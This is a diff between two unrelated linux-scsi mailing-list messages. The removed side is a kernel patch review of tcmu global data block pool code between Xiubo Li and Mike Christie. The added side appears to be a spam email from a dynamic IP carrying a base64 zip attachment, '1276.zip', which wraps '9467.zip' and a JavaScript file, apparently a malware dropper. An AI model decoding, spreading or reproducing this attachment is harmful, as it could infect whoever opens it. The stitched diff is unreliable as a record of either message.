@@ -1,244 +1,100 @@
-From: Xiubo Li <lixiubo@cmss.chinamobile.com>
-Subject: Re: [PATCH v6 2/2] tcmu: Add global data block pool support
-Date: Sun, 30 Apr 2017 19:29:08 +0800
-Message-ID: <25e7247f-116f-aaa5-e895-b503c0a893f9@cmss.chinamobile.com>
-References: <1493187952-13125-1-git-send-email-lixiubo@cmss.chinamobile.com>
- <1493187952-13125-3-git-send-email-lixiubo@cmss.chinamobile.com>
- <590592D4.8090607@redhat.com>
+From: <linux1@telus.net>
+Subject: 31050 linux-scsi
+Date: Sun, 30 Apr 2017 11:46:07 -0000
+Message-ID: <149355276769.16693.943919452429217704@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=windows-1252; format=flowed
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="1276.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-scsi-owner@vger.kernel.org>
-Received: from cmccmta1.chinamobile.com ([221.176.66.79]:14076 "EHLO
-        cmccmta1.chinamobile.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751239AbdD3L3R (ORCPT
-        <rfc822;linux-scsi@vger.kernel.org>); Sun, 30 Apr 2017 07:29:17 -0400
-In-Reply-To: <590592D4.8090607@redhat.com>
+Received: from 114-26-186-34.dynamic-ip.hinet.net ([114.26.186.34]:56917 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1167280AbdD3LqX (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
+        Sun, 30 Apr 2017 07:46:23 -0400
+Content-Disposition: attachment
 Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
-To: Mike Christie <mchristi@redhat.com>, nab@linux-iscsi.org
-Cc: agrover@redhat.com, iliastsi@arrikto.com, namei.unix@gmail.com, sheng@yasker.org, linux-scsi@vger.kernel.org, target-devel@vger.kernel.org, linux-kernel@vger.kernel.org, Jianfei Hu <hujianfei@cmss.chinamobile.com>
+To: linux-scsi@vger.kernel.org
 
-[...]
-
->> +
->> +static bool tcmu_get_empty_blocks(struct tcmu_dev *udev,
->> +				  struct tcmu_cmd *tcmu_cmd,
->> +				  uint32_t blocks_needed)
->
-> Can drop blocks_needed.
->
-Will fix it.
-
-[...]
->>   
->> -static void *tcmu_get_block_addr(struct tcmu_dev *udev, uint32_t dbi)
->> +static inline struct page *
->> +tcmu_get_block_page(struct tcmu_dev *udev, uint32_t dbi)
->>   {
->>   	return radix_tree_lookup(&udev->data_blocks, dbi);
->>   }
->> @@ -365,17 +417,20 @@ static int alloc_and_scatter_data_area(struct tcmu_dev *udev,
->
-> We don't actually alloc the area here any more. Could probably rename
-> it to be similar to gather_data_area.
->
-Yes, will rename to scatter_data_area.
-
-[...]
->
->> @@ -616,6 +711,7 @@ static bool is_ring_space_avail(struct tcmu_dev *udev, size_t cmd_size, size_t d
->>   			&iov, &iov_cnt, copy_to_data_area);
->>   	if (ret) {
->>   		pr_err("tcmu: alloc and scatter data failed\n");
->> +		mutex_unlock(&udev->cmdr_lock);
->
-> I think here and in the error case below, you need to do a
-> tcmu_cmd_free_data.
->
-Yes, good catch, and the tcmu_cmd_free_data is needed here to free the 
-bits in udev->data_bitmap.
-And the unlock will be added in the first patch.
-
-[...]
->> +static struct page *tcmu_try_get_block_page(struct tcmu_dev *udev, uint32_t dbi)
->> +{
->> +	struct page *page;
->> +	int ret;
->> +
->> +	mutex_lock(&udev->cmdr_lock);
->> +	page = tcmu_get_block_page(udev, dbi);
->> +	if (likely(page)) {
->> +		mutex_unlock(&udev->cmdr_lock);
->> +		return page;
->> +	}
->> +
->> +	/*
->> +	 * Normally it shouldn't be here:
->> +	 * Only when the userspace has touched the blocks which
->> +	 * are out of the tcmu_cmd's data iov[], and will return
->> +	 * one zeroed page.
->
-> Is it a userspace bug when this happens? Do you know when it is occcuring?
-Since the UIO will map the whole ring buffer to the user space at the 
-beginning, and the userspace is allowed and legal to access any block 
-within the limits of the mapped ring area.
-
-But actually when this happens, it normally will be one bug of the 
-userspace. Without this checking the kernel will output many page fault 
-dump traces.
-
-Maybe here outputing some warning message is a good idea, and will be 
-easy to debug for userspace.
-
-
-[...]
->> @@ -1388,6 +1509,81 @@ static ssize_t tcmu_cmd_time_out_store(struct config_item *item, const char *pag
->>   	.tb_dev_attrib_attrs	= NULL,
->>   };
->>   
->> +static int unmap_thread_fn(void *data)
->> +{
->> +	struct tcmu_dev *udev;
->> +	loff_t off;
->> +	uint32_t start, end, block;
->> +	struct page *page;
->> +	int i;
->> +
->> +	while (1) {
->> +		DEFINE_WAIT(__wait);
->> +
->> +		prepare_to_wait(&unmap_wait, &__wait, TASK_INTERRUPTIBLE);
->> +		schedule();
->> +		finish_wait(&unmap_wait, &__wait);
->> +
->> +		mutex_lock(&root_udev_mutex);
->> +		list_for_each_entry(udev, &root_udev, node) {
->> +			mutex_lock(&udev->cmdr_lock);
->> +
->> +			/* Try to complete the finished commands first */
->> +			tcmu_handle_completions(udev);
->> +
->> +			/* Skip the udevs waiting the global pool or in idle */
->> +			if (udev->waiting_global || !udev->dbi_thresh) {
->> +				mutex_unlock(&udev->cmdr_lock);
->> +				continue;
->> +			}
->> +
->> +			end = udev->dbi_max + 1;
->> +			block = find_last_bit(udev->data_bitmap, end);
->> +			if (block == udev->dbi_max) {
->> +				/*
->> +				 * The last bit is dbi_max, so there is
->> +				 * no need to shrink any blocks.
->> +				 */
->> +				mutex_unlock(&udev->cmdr_lock);
->> +				continue;
->> +			} else if (block == end) {
->> +				/* The current udev will goto idle state */
->> +				udev->dbi_thresh = start = 0;
->> +				udev->dbi_max = 0;
->> +			} else {
->> +				udev->dbi_thresh = start = block + 1;
->> +				udev->dbi_max = block;
->> +			}
->> +
->> +			/* Here will truncate the data area from off */
->> +			off = udev->data_off + start * DATA_BLOCK_SIZE;
->> +			unmap_mapping_range(udev->inode->i_mapping, off, 0, 1);
->> +
->> +			/* Release the block pages */
->> +			for (i = start; i < end; i++) {
->> +				page = radix_tree_delete(&udev->data_blocks, i);
->> +				if (page) {
->> +					__free_page(page);
->> +					atomic_dec(&global_db_count);
->> +				}
->> +			}
->> +			mutex_unlock(&udev->cmdr_lock);
->> +		}
->> +
->> +		/*
->> +		 * Try to wake up the udevs who are waiting
->> +		 * for the global data pool.
->> +		 */
->> +		list_for_each_entry(udev, &root_udev, node) {
->> +			if (udev->waiting_global)
->> +				wake_up(&udev->wait_cmdr);
->> +		}
->
-> To avoid starvation, I think you want a second list/fifo that holds the
-> watiers. In tcmu_get_empty_block if the list is not empty, record how
-> many pages we needed and then add the device to the list and wait in
-> tcmu_queue_cmd_ring.
->
-> Above if we freed enough pages for the device at head then wake up the
-> device.
->
-> I think you also need a wake_up call in the completion path in case the
-> initial call could not free enough pages. It could probably check if the
-> completion was going to free enough pages for a waiter and then call wake.
->
-Yes, I meant to introduce this later after this series to not let the 
-patches too
-complex to review.
-
-If you agree I will do this later, or in V7 series ?
-
->> +		mutex_unlock(&root_udev_mutex);
->> +	}
->> +
->> +	return 0;
->> +}
->> +
->>   static int __init tcmu_module_init(void)
->>   {
->>   	int ret, i, len = 0;
->> @@ -1433,8 +1629,17 @@ static int __init tcmu_module_init(void)
->>   	if (ret)
->>   		goto out_attrs;
->>   
->> +	init_waitqueue_head(&unmap_wait);
->> +	unmap_thread = kthread_run(unmap_thread_fn, NULL, "tcmu_unmap");
->> +	if (IS_ERR(unmap_thread)) {
->> +		unmap_thread = NULL;
-> No need to set unmap_thread to NULL since nothing will ever see it
-> again. You should set ret to an error value so module_init is failed
-> properly:
->
-> ret = PTR_ERR(unmap_thread);
->
->
-Will fix it.
-
->> +		goto out_unreg_transport;
->> +	}
->> +
->>   	return 0;
->>   
->> +out_unreg_transport:
->> +	target_backend_unregister(&tcmu_ops);
->>   out_attrs:
->>   	kfree(tcmu_attrs);
->>   out_unreg_genl:
->> @@ -1449,6 +1654,9 @@ static int __init tcmu_module_init(void)
->>   
->>   static void __exit tcmu_module_exit(void)
->>   {
->> +	if (unmap_thread)
->
-> The module exit will only be called if init succeeded so you can drop
-> the check.
-Will fix it.
-
-Thank very much,
-
-BRs
-Xiubo
-
->> +		kthread_stop(unmap_thread);
->> +
->>   	target_backend_unregister(&tcmu_ops);
->>   	kfree(tcmu_attrs);
->>   	genl_unregister_family(&tcmu_genl_family);
->>
+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
+AAAA2xEAAAAA
